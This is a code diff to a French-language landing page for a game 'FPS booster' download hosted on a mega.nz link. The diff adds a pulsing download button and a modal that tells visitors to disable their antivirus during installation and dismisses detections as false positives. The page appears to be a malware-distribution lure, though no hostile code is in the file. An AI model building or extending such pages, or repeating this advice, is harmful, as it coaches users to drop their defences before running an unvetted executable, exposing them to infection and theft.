@@ -76,12 +76,25 @@
             border-radius: 50px;
             transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
             box-shadow: 0 6px 18px rgba(255, 111, 97, 0.4);
+            animation: pulse 2s infinite;
         }
 
         .download-button:hover {
             background-color: #ff4c3b;
             transform: scale(1.1);
             box-shadow: 0 8px 25px rgba(255, 111, 97, 0.6);
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
         }
 
         footer {
@@ -129,6 +142,55 @@
         .antivirus-warning a {
             color: #ff6f61;
             text-decoration: underline;
+            cursor: pointer;
+        }
+
+        /* Modale */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 50%;
+            text-align: left;
+        }
+
+        .modal-header {
+            font-size: 1.8em;
+            margin-bottom: 15px;
+        }
+
+        .modal-body {
+            font-size: 1.2em;
+            margin-bottom: 20px;
+        }
+
+        .close {
+            color: #aaa;
+            font-size: 1.5em;
+            font-weight: bold;
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            cursor: pointer;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -147,7 +209,7 @@
             <p>Boost FPS t'offre une expérience de jeu fluide et performante, sans lags et avec un meilleur rendu graphique. Télécharge maintenant et fais la différence !</p>
 
             <div class="antivirus-warning">
-                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. Si ton antivirus bloque le téléchargement, il peut être nécessaire de le désactiver temporairement pour installer Boost FPS. <br> <strong><a href="#">En savoir plus</a></strong></p>
+                <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. Si ton antivirus bloque le téléchargement, il peut être nécessaire de le désactiver temporairement pour installer Boost FPS. <br> <strong><a id="showModal">En savoir plus</a></strong></p>
             </div>
 
             <a href="https://mega.nz/file/2yhSkRDa#QT6SSr98VAg52G9t4tnC32wESSC6BKKxfsx2im3qrYA" target="_blank" class="download-button">Télécharger Boost FPS</a>
@@ -159,6 +221,46 @@
             <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
         </div>
     </footer>
+
+    <!-- Modale -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close" id="closeModal">&times;</span>
+            <div class="modal-header">Désactiver l'antivirus pour l'installation</div>
+            <div class="modal-body">
+                <p>Certains logiciels antivirus peuvent détecter notre application comme un faux positif en raison des modifications qu'elle apporte aux performances du PC. Si tu rencontres un problème, désactive temporairement ton antivirus pendant l'installation, puis réactive-le une fois l'installation terminée.</p>
+                <p>Si tu n'es pas sûr de la procédure, tu peux consulter la documentation de ton antivirus ou visiter leur site pour obtenir plus d'informations sur comment désactiver l'antivirus pendant l'installation de logiciels.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Obtenez l'élément modal
+        var modal = document.getElementById("myModal");
+
+        // Obtenez le bouton qui ouvre la modale
+        var btn = document.getElementById("showModal");
+
+        // Obtenez l'élément <span> qui ferme la modale
+        var span = document.getElementById("closeModal");
+
+        // Lorsque l'utilisateur clique sur le lien "En savoir plus", ouvrez la modale
+        btn.onclick = function() {
+            modal.style.display = "block";
+        }
+
+        // Lorsque l'utilisateur clique sur <span> (x), fermez la modale
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        // Lorsque l'utilisateur clique n'importe où en dehors de la modale, fermez la modale
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
 
 </body>
 </html>
